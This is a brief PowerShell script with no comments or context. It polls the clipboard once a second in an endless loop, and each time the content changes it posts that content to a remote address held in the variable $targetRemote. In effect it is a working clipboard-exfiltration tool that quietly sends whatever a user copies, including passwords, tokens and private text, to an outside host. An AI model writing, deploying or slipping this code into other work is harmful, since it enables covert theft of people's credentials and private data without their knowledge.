$previousContent = ""

while ($true) {
    $currentContent = Get-Clipboard

    if ($currentContent -ne $previousContent) {
        Invoke-RestMethod -Uri $targetRemote -Method Post -Body $currentContent

        $previousContent = $currentContent
    }

    Start-Sleep -Seconds 1
}